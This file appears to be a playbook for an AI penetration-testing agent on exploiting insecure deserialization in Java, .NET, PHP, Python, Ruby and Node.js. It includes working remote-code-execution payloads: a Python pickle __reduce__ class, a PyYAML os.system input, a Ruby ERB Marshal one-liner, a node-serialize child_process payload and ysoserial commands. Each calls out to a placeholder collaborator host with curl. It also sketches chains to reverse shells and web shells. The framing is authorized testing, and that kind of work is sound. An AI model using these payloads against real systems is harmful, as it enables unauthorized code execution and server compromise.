---
description: Insecure deserialization — Java (ysoserial), .NET (ViewState / TextFormattingRunProperties), PHP (POP), Python (pickle / PyYAML), Ruby (Marshal), Node.js (node-serialize / JSON revivers). Load when serialized blobs appear in cookies / hidden fields / Authorization / Content-Type indicates magic bytes.
globs:
---

# Insecure Deserialization Deep-Dive

Load when: a request carries a serialized blob (base64 cookies / `__VIEWSTATE` / `oj/Object#` / pickle magic / etc.), OR `Content-Type: application/x-java-serialized-object`, OR the tech stack is Java/.NET/Python/Ruby/Node with a known-vulnerable library version.

## Magic-byte identification

The format dictates the gadget chain. Identify it first.

| Format | Magic bytes (base64 prefix) | Hex prefix | Stack |
|---|---|---|---|
| Java serialized | `rO0AB...` | `ac ed 00 05` | Java + RMI / JMS / Spring / JBoss |
| .NET BinaryFormatter | `AAEAAAD/...` | `00 01 00 00 00 ff` | .NET legacy WCF / WebForms |
| .NET ViewState | `/wEPDw...` | `7f 06 ...` | ASP.NET WebForms — base64(`__VIEWSTATE`) |
| PHP serialize | `O:N:"...";` literal | — | PHP (`unserialize`) |
| Python pickle | `gASV...` / `\x80\x04` | `80 04 / 80 05` | Python (`pickle.loads`) |
| PyYAML | `!!python/object:` | — | Python (`yaml.load` without SafeLoader) |
| Ruby Marshal | `BAh7B...` | `04 08` | Ruby (`Marshal.load`) |
| Node-serialize | `_$$ND_FUNC$$_` | — | Node.js `node-serialize` package |

Quick check: pipe captured token through `decode_encode(value, ops=['base64'])` and inspect for these signatures.

## Java path

### ysoserial gadget chains

Operator-side: `generate_deserialization_gadget(target='java', chain='CommonsCollections1', command='curl http://COLLABORATOR')` — Praetor's wrapper around ysoserial (W1 wave).

Common chains by classpath fingerprint:

| Chain | Classpath signal | Status |
|---|---|---|
| `CommonsCollections1` (CC1-CC11) | `org.apache.commons.collections` in error stacks | Most common, often patched ≥ 3.2.2 |
| `Spring1` | `org.springframework` | Affects pre-Spring4Shell + post |
| `BeanShell1` | `bsh.Interpreter` in stack | JBoss bundles BSH |
| `Hibernate1` / `Hibernate2` | `org.hibernate` | Persistent-object deserial |
| `Groovy1` | `groovy-all*.jar` | Grails / Jenkins-bundled |
| `URLDNS` | NEVER fails — only does DNS lookup | DNS-only confirmation; use first to confirm reach without RCE risk |
| `JRMPClient` / `JRMPListener` | JMX / RMI in stack | Inter-process JNDI lookup |

Always start with `URLDNS` for blind confirmation — it's destructive-free.

### Detection workflow

1. Find the sink: serialized blob in cookie / hidden field / RMI / Spring HTTP invoker / JMX endpoint.
2. Replace with `URLDNS` payload pointing to Collaborator.
3. Observe DNS hit within 30s — deserial reachable.
4. Upgrade to `CommonsCollections1` or detected chain with `command='curl http://COLLABORATOR/marker'` — observe HTTP hit.
5. Confirm RCE: NEVER `cat /etc/shadow` / NEVER destructive. Use Collaborator marker only.

### .NET path

| Sink | Tool | Severity |
|---|---|---|
| `__VIEWSTATE` with leaked / weak MachineKey | `ysoserial.net -g TextFormattingRunProperties -c "ping COLLABORATOR"` | CRITICAL |
| `BinaryFormatter.Deserialize` in REST endpoint | Same gadget catalog | CRITICAL |
| `LosFormatter` (legacy) | Same | CRITICAL |
| `Json.NET` with `TypeNameHandling != None` | `{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, ..."}` | CRITICAL |

The `weak_viewstate_known_key_2025` context (W8 tech_vulns) covers ViewState forge detection. KEV/EPSS likely flags it on commercial scanners.

## PHP path

`unserialize($_COOKIE['session'])` with attacker-controlled cookie → POP (Property-Oriented Programming) chain.

Common POP gadgets:
- **Laravel** `Illuminate\Foundation\Application::__destruct` → arbitrary code via container resolution.
- **Symfony** `Symfony\Component\HttpFoundation\Response::__destruct` → write response to attacker-defined target.
- **WordPress** `Requests_Utility_FilteredIterator::__destruct` → SQLi gadget when chained with array push.
- **Custom code**: any class with `__destruct` / `__wakeup` / `__call` magic methods + a file-write or eval-style sink.

Detection: inject crafted `O:N:"ClassName":n:{...}` matching detected stack. PHPGGC tool catalogues 50+ chains.

## Python path

### Pickle

`pickle.loads(base64.b64decode(cookie))` — directly exploitable with `reduce` opcode:

```python
import pickle, base64
class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://COLLABORATOR',))
payload = base64.b64encode(pickle.dumps(Exploit())).decode()
```

ALWAYS use Collaborator marker; never `rm -rf` etc.

### PyYAML

`yaml.load(input)` (without `Loader=SafeLoader`) accepts `!!python/object:os.system [args]`. Fixed in PyYAML 5.1+ default.

Detection: send `!!python/object/new:os.system ["curl http://COLLABORATOR"]` and observe Collaborator hit.

## Ruby path

`Marshal.load(decoded)` — universal RCE primitive. Rails session cookies were Marshal-encoded until Rails 4.0; legacy apps still vulnerable.

Universal RCE one-liner via `ERB::Compiler`:
```ruby
require 'erb'
erb = ERB.new('<% system("curl http://COLLABORATOR") %>')
Marshal.dump(erb).bytes
```

## Node.js path

`node-serialize` package's `unserialize()` with `_$$ND_FUNC$$_` prefix evaluates JavaScript:

```
{"rce":"_$$ND_FUNC$$_require('child_process').exec('curl http://COLLABORATOR')"}
```

Also: JSON revivers (`JSON.parse(input, reviver)`) with prototype pollution chaining (cross-ref `playbook-prototype-pollution.md`).

## Evidence ladder

| Verdict | Evidence shape | Save? |
|---|---|---|
| **CONFIRMED CRITICAL** | RCE marker reached (Collaborator HTTP+DNS hit) AND 3 replays consistent | yes |
| **CONFIRMED HIGH** | DNS-only confirmation via URLDNS / similar — proves deserial reachable but RCE not yet chained | yes |
| **SUSPECTED** | Server processes the magic bytes (no error) but no callback yet — investigate chain | NO save — keep iterating |
| **FAILED** | Server rejects the payload or no reachable sink | NO |

## Severity discipline

- RCE via deserial = CRITICAL.
- DNS-only confirmation (URLDNS-class) without RCE chain = HIGH (still demonstrates trust-boundary failure).
- Detected magic bytes but no callback within window = SUSPECTED — investigate, don't save.

## save_finding shape

```python
save_finding(
    vuln_type="deserialization",
    endpoint="https://target.com/api/session",
    parameter="session_cookie",
    severity="critical",
    evidence={
        "logger_index": <rce-confirming index>,
        "collaborator_interaction_id": "<id>",
        "summary": "Java deserialization via CommonsCollections1 — base64'd session cookie reaches readObject; RCE chain exec'd `curl COLLABORATOR/marker` → DNS+HTTP confirmed.",
        "format": "java_serialized",                  # or dotnet_viewstate, php_unserialize, python_pickle, ruby_marshal, node_serialize
        "gadget_chain": "CommonsCollections1",
        "ysoserial_command": "java -jar ysoserial.jar CommonsCollections1 'curl http://COLLABORATOR/marker'",
        "reproductions": [
            {"logger_index": ..., "elapsed_ms": ..., "status_code": ...},
            ...,
        ],
    },
)
```

## NEVER_SUBMIT traps

- "Cookie contains base64 with magic bytes" — without runtime test, just structural observation.
- "App uses Java serialization" — by-design feature, not a vuln.
- "Tested with `cat /etc/passwd` payload" — Rule 5 violation; never use destructive payloads.

## Chain patterns

- **Deserial → RCE → reverse shell** = direct ATO at OS level.
- **Deserial via JSON.NET `$type` + path traversal** = file write → web shell upload.
- **Java deserial via JNDI/RMI → Log4Shell-class** = CVE-2021-44228 family.
- **ViewState forge + MachineKey leak** = persistent RCE in ASP.NET app.
- **Pickle / PyYAML + container escape** = host RCE in K8s pod.

## Related

- `knowledge/deserialization.json` — covers .NET ViewState + Java commons-collections + Jackson polymorphic (W8 additions: jboss_bshdeployer_mbean + jackson_polymorphic_rce)
- `generate_deserialization_gadget(target='java', chain=...)` — Praetor's ysoserial wrapper (W1)
- `confirm_rce(endpoint, parameter, command='id')` — Verdict-returning RCE confirmation (W7)
- `chain-findings.md` — `deserial_to_rce_to_shell` progression
- Rule 5 — destructive denylist
- Rule 9a — Collaborator-only for blind testing
